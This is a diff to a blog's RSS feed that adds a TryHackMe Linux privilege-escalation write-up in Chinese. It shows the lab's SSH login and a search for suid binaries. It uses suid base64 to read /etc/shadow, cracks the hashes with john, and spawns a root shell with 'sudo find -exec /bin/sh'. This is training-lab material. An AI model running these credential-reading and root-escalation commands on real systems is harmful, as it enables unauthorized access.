@@ -5,15 +5,65 @@
         <link>https://k1t0111.github.io</link>
         <description>一点小分享</description>
         <language>zh-CN</language>
-        <pubDate>Thu, 01 Feb 2024 09:49:48 +0800</pubDate>
-        <lastBuildDate>Thu, 01 Feb 2024 09:49:48 +0800</lastBuildDate>
-        <category>小小简单靶场</category>
-        <category>wp集合</category>
+        <pubDate>Mon, 04 Mar 2024 21:24:08 +0800</pubDate>
+        <lastBuildDate>Mon, 04 Mar 2024 21:24:08 +0800</lastBuildDate>
         <category>ctfmisc</category>
+        <category>wp集合</category>
         <category>ctfweb</category>
+        <category>小小简单靶场</category>
         <category>sql注入</category>
         <category>linux提权</category>
         <category>tryhackme</category>
+        <item>
+            <guid isPermalink="true">https://k1t0111.github.io/2024/03/04/thm/</guid>
+            <title>thm_Linux_Privilege_Escalation_Challenge</title>
+            <link>https://k1t0111.github.io/2024/03/04/thm/</link>
+            <category>linux提权</category>
+            <category>tryhackme</category>
+            <pubDate>Mon, 04 Mar 2024 21:24:08 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;ul class=&#34;toc&#34;&gt;
+&lt;li&gt;&lt;a href=&#34;#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86&#34;&gt;信息收集&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#passwd%E6%8F%90%E6%9D%83&#34;&gt;passwd提权&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#sudo%E6%8F%90%E6%9D%83&#34;&gt;sudo提权&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#flag2txt&#34;&gt;flag2.txt&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/p&gt;
+&lt;h1 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ssh 连接到 目标机器&lt;br /&gt;
+您可以通过浏览器访问目标计算机或使用下面的 SSH 凭据。&lt;br /&gt;
+&lt;strong&gt;Username:&lt;/strong&gt; leonard&lt;br /&gt;
+&lt;strong&gt;Password:&lt;/strong&gt; Penny123&lt;br /&gt;
+ 直接查看 suid 的可执行文件&lt;br /&gt;
+ find /  -perm -04000 2&amp;gt;/dev/null&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/base64&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/ksu&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/fusermount&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/passwd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/gpasswd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/chage&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/newgrp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/staprun&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/chfn&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/su&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/chsh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/Xorg&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/mount&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/umount&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/crontab&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/pkexec&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/at&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/sudo&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/sbin/pam_timestamp_check&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/sbin/unix_chkpwd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/sbin/usernetctl&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/sbin/userhelper&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/sbin/mount.nfs&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/lib/polkit-1/polkit-agent-helper-1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/kde4/kpac_dhcp_helper&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/dbus-1/dbus-daemon-launch-helper&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/qemu-bridge-helper&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/sssd/krb5_child&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/sssd/ldap_child&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/sssd/selinux_child&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/sssd/proxy_child&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/flatpak-bwrap&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;/usr/bin/base64 带 suid 的 /usr/bin/base64 可以读取 /etc/passwd 和 /etc/shadow&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;passwd提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#passwd提权&#34;&gt;#&lt;/a&gt; passwd 提权&lt;/h1&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;base64 /etc/shadow &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; base64 &lt;span class=&#34;token parameter variable&#34;&gt;--decode&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;base64 /etc/passwd &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; base64 &lt;span class=&#34;token parameter variable&#34;&gt;--decode&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;读出来后分别保存在 1.txt 和 2.txt 中&lt;br /&gt;
+在攻击机器上 unshadow 1.txt 2.txt &amp;gt; 3&lt;br /&gt;
+ 直接 john 3 爆破&lt;br /&gt;
+&lt;img data-src=&#34;https://files.catbox.moe/ycbdfb.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+但是无法爆破出 root 出来我们可以先登录到 missy 用户&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;sudo提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sudo提权&#34;&gt;#&lt;/a&gt; sudo 提权&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;登陆到 missy 先找一波 flag1.txt&lt;br /&gt;
+find / -name flag1.txt 2&amp;gt;/dev/null&lt;br /&gt;
+ 找到 /home/missy/Documents/flag1.txt&lt;br /&gt;
+ 再次进行信息收集 sudo -l 看看有什么执行文件有 sudo 权限&lt;br /&gt;
+ /usr/bin/find 只有一个 find 本来还想玩玩 LD_PRELOAD 但发现 没有这个 env_keep 可惜..........&lt;br /&gt;
+ 无所谓 find 命令照样提权&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-exec&lt;/span&gt; /bin/sh &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-quit&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;flag2txt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flag2txt&#34;&gt;#&lt;/a&gt; flag2.txt&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;root 权限下读取&lt;br /&gt;
+ /home/rootflag/flag2.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://k1t0111.github.io/2024/02/01/tryhackme-overpass-wp/</guid>
             <title>Tryhackme-Overpass-wp</title>
